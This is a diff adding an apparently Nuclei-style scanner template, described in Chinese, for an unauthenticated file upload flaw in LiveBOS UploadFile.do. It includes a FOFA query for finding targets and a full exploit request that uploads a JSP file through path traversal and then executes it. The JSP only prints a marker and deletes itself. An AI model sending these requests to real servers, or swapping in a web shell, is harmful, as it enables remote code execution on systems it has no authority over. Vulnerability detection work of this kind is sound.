@@ -1,0 +1,55 @@
+id: LiveBOS-UploadFile-File-upload
+
+info:
+  name: "LiveBOS UploadFile.do 组件任意文件上传漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="Power by LiveBOS"
+    该漏洞存在于 LiveBOS UploadFile.do 处理组件中，攻击者无需身份验证即可通过构造恶意文件上传请求，在目标服务器文件系统中部署可执行内容。成功利用可导致远程代码执行，攻击者能够创建持久化后门并完全控制 Web 服务器，进而可能横向渗透至内网其他系统。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140926931
+  tags: LiveBOS
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+- raw:
+  - |
+    POST /feed/UploadFile.do;.js.jsp HTTP/1.1 
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxegqoxxi
+
+    ------WebKitFormBoundaryxegqoxxi
+    Content-Disposition: form-data; name="file"; filename="/../../../../{{username}}.jsp"
+    Content-Type: image/jpeg
+
+    <%@ page import="java.io.File" %>
+    <%
+      out.println("pboyjnnrfipmplsukdeczudsefxmywe");
+      String filePath = application.getRealPath(request.getServletPath());
+      new File(filePath).delete();
+    %>
+    ------WebKitFormBoundaryxegqoxxi--
+
+
+  - |
+    GET /{{username}}.jsp;.js.jsp HTTP/1.1
+    Host: {{Hostname}}
+
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'pboyjnnrfipmplsukdeczudsefxmywe'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
